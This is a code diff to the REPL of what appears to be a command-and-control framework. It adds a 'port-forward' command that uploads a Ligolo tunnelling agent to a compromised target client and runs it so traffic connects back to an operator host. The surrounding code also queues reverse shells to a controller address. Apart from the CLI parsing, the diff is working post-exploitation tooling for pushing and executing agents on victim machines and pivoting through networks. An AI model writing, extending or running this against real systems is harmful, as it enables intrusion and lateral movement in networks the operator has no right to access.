@@ -116,6 +116,19 @@ def build_repl_parser() -> Tuple[
     sp.add_argument("controller_addr", help="Controller address (host:port)")
     sp.add_argument("--client", required=False)
 
+    # port-forward (REPL)
+    sp = sub.add_parser(
+        "port-forward",
+        help="Upload and run Ligolo agent for port forwarding",
+    )
+    sp.add_argument("--ligolo-path", required=True, help="Path to Ligolo agent binary")
+    sp.add_argument(
+        "--connect-args",
+        required=True,
+        help="Arguments passed after --connect, e.g. '127.0.0.1:1000 -slefcert'",
+    )
+    sp.add_argument("--client", required=False)
+
     sp = sub.add_parser("local", help="Run a local shell command")
     sp.add_argument("local_command", help="Local command to run")
 
@@ -476,6 +489,64 @@ async def run_repl(args) -> None:
             if resp.get("type") == "QUEUED":
                 enhanced_ui.show_operation_queued("Reverse shell", target, f"→ {controller_addr}")
                 print(f"{ui.TAG_INF} 🌐 Open a listener on {ui.c(controller_addr, 'bold')} to receive the shell")
+            else:
+                print_error(ui, resp)
+            continue
+
+        # ---- port forward ----
+        if cmd == "port-forward":
+            ligolo_path = ns.ligolo_path
+            connect_args = ns.connect_args
+            target = _resolve_client(getattr(ns, "client", None))
+            if not target:
+                enhanced_ui.show_no_client_error()
+                continue
+            if not os.path.isfile(ligolo_path):
+                enhanced_ui.show_error_with_suggestions(
+                    "Ligolo agent binary not found",
+                    ["Verify --ligolo-path", "Check file permissions"],
+                )
+                continue
+            try:
+                with open(ligolo_path, "rb") as f:
+                    payload = f.read()
+            except Exception as e:
+                enhanced_ui.show_error_with_suggestions(f"Failed to read binary: {e}")
+                continue
+            filename = os.path.basename(ligolo_path)
+
+            # Step 1: upload the agent to the target
+            resp, _ = await admin_send(
+                args.host,
+                args.port,
+                args.auth_token,
+                {
+                    "action": "push",
+                    "target_id": target,
+                    "dest": filename,
+                    "src_name": filename,
+                },
+                payload,
+            )
+            if resp.get("type") != "QUEUED":
+                print_error(ui, resp)
+                continue
+            enhanced_ui.show_operation_queued("File upload", target, filename)
+
+            # Step 2: run the uploaded agent
+            resp, _ = await admin_send(
+                args.host,
+                args.port,
+                args.auth_token,
+                {
+                    "action": "port_forward",
+                    "target_id": target,
+                    "filename": filename,
+                    "connect_args": connect_args,
+                },
+            )
+            if resp.get("type") == "QUEUED":
+                enhanced_ui.show_operation_queued("Port forward", target, filename)
             else:
                 print_error(ui, resp)
             continue
